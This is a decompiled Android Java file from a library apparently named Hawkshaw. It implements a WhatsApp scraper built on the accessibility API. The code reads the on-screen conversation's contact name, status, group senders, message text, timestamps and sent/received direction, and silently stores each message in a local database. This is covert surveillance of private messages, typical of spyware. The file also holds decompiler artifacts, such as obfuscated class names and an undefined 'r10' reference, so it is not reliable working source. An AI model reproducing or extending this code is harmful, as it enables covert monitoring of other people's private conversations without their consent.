package com.hawkshaw.library.features.accessibility.socialmedia;

import M1.d;
import Y1.K;
import android.graphics.Rect;
import android.view.accessibility.AccessibilityNodeInfo;
import com.hawkshaw.library.datalayer.models.PackageName;
import com.hawkshaw.library.datalayer.room.AppDatabaseKt;
import com.hawkshaw.library.datalayer.room.socialmedia.SocialMediaEntity;
import com.hawkshaw.library.features.accessibility.AccessibilityUtilsKt;
import com.hawkshaw.library.ktextensions.NumbersKt;
import java.text.SimpleDateFormat;
import java.time.DayOfWeek;
import java.time.format.DateTimeFormatter;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.regex.Pattern;
import me.pushy.sdk.lib.jackson.core.util.MinimalPrettyPrinter;
import r3.j;

public final class Whatsapp {
    public static final Whatsapp INSTANCE = new Whatsapp();

    /* renamed from: p  reason: collision with root package name */
    private static final String f4969p = "com.whatsapp:id";

    private Whatsapp() {
    }

    private final Long extractGlobalTimestamp(String str) {
        Pattern compile = Pattern.compile("[A-Za-z]{2}[A-Za-z]+ (0?[1-9]|[12][0-9]|3[01]), \\d{4}$");
        K.m(compile, "compile(...)");
        Pattern compile2 = Pattern.compile("Today");
        K.m(compile2, "compile(...)");
        Pattern compile3 = Pattern.compile("Yesterday");
        K.m(compile3, "compile(...)");
        Pattern compile4 = Pattern.compile("[A-Za-z]{3}[A-Za-z]+");
        K.m(compile4, "compile(...)");
        Calendar instance = Calendar.getInstance();
        instance.set(11, 0);
        instance.set(12, 0);
        instance.set(13, 0);
        instance.set(14, 0);
        if (str == null || j.U(str)) {
            return null;
        }
        K.n(str, "input");
        if (compile.matcher(str).matches()) {
            Date parse = new SimpleDateFormat("MMMM dd, yyyy", Locale.getDefault()).parse(str);
            if (parse != null) {
                return Long.valueOf(parse.getTime());
            }
            return null;
        } else if (compile2.matcher(str).matches()) {
            return Long.valueOf(instance.getTimeInMillis());
        } else {
            if (compile3.matcher(str).matches()) {
                instance.set(5, instance.get(5) - 1);
                return Long.valueOf(instance.getTimeInMillis());
            } else if (!compile4.matcher(str).matches()) {
                return null;
            } else {
                int value = instance.get(7) - ((DayOfWeek.from(DateTimeFormatter.ofPattern("EEEE").parse(str)).getValue() % 7) + 1);
                if (value <= 0) {
                    value += 7;
                }
                instance.set(6, instance.get(6) - value);
                return Long.valueOf(instance.getTimeInMillis());
            }
        }
    }

    /* access modifiers changed from: private */
    public static final void extractMessages$lambda$3(SocialMediaEntity socialMediaEntity) {
        K.n(socialMediaEntity, "$entity");
        AppDatabaseKt.getDb().socialMediaDao().insertSync(socialMediaEntity);
    }

    public final void extractMessages(AccessibilityNodeInfo accessibilityNodeInfo, ExecutorService executorService) {
        CharSequence text;
        String obj;
        CharSequence text2;
        CharSequence text3;
        AccessibilityNodeInfo accessibilityNodeInfo2 = accessibilityNodeInfo;
        ExecutorService executorService2 = executorService;
        K.n(accessibilityNodeInfo2, "node");
        K.n(executorService2, "executor");
        AccessibilityNodeInfo findFirst = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.whatsapp:id/conversation_contact_name");
        CharSequence text4 = findFirst != null ? findFirst.getText() : null;
        if (text4 != null) {
            AccessibilityNodeInfo findFirst2 = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "com.whatsapp:id/conversation_contact_status");
            CharSequence text5 = findFirst2 != null ? findFirst2.getText() : null;
            AccessibilityNodeInfo findFirst3 = AccessibilityUtilsKt.findFirst(accessibilityNodeInfo2, "android:id/list");
            if (findFirst3 != null) {
                int childCount = findFirst3.getChildCount();
                Long l5 = null;
                String str = null;
                for (int i5 = 0; i5 < childCount; i5++) {
                    AccessibilityNodeInfo child = findFirst3.getChild(i5);
                    if (child != null) {
                        AccessibilityNodeInfo findFirst4 = AccessibilityUtilsKt.findFirst(child, "com.whatsapp:id/name_in_group_tv");
                        if (!(findFirst4 == null || (text3 = findFirst4.getText()) == null)) {
                            str = text3.toString();
                        }
                        AccessibilityNodeInfo findFirst5 = AccessibilityUtilsKt.findFirst(child, "com.whatsapp:id/conversation_row_date_divider");
                        if (!(findFirst5 == null || (text2 = findFirst5.getText()) == null)) {
                            l5 = INSTANCE.extractGlobalTimestamp(text2.toString());
                            Researcher researcher = Researcher.INSTANCE;
                            researcher.print("GT - " + text2 + ", " + l5);
                        }
                        AccessibilityNodeInfo findFirst6 = AccessibilityUtilsKt.findFirst(child, "com.whatsapp:id/message_text");
                        CharSequence text6 = findFirst6 != null ? findFirst6.getText() : null;
                        if (text6 != null) {
                            Rect rect = new Rect();
                            findFirst6.getBoundsInScreen(rect);
                            SocialMediaEntity.Type type = NumbersKt.getDp(rect.left) < 65 ? SocialMediaEntity.Type.Received : SocialMediaEntity.Type.Sent;
                            AccessibilityNodeInfo findFirst7 = AccessibilityUtilsKt.findFirst(child, "com.whatsapp:id/date");
                            String d02 = (findFirst7 == null || (text = findFirst7.getText()) == null || (obj = text.toString()) == null) ? null : j.d0(obj, " ", MinimalPrettyPrinter.DEFAULT_ROOT_VALUE_SEPARATOR);
                            SocialMediaEntity socialMediaEntity = r10;
                            SocialMediaEntity socialMediaEntity2 = new SocialMediaEntity(String.valueOf(text4), text5 != null ? text5.toString() : null, str, text6.toString(), type, Instagram.INSTANCE.extractTimestamp(d02, l5), PackageName.WHATSAPP, String.valueOf(d02));
                            executorService2.execute(new d(socialMediaEntity, 2));
                        }
                    }
                }
            }
        }
    }
}
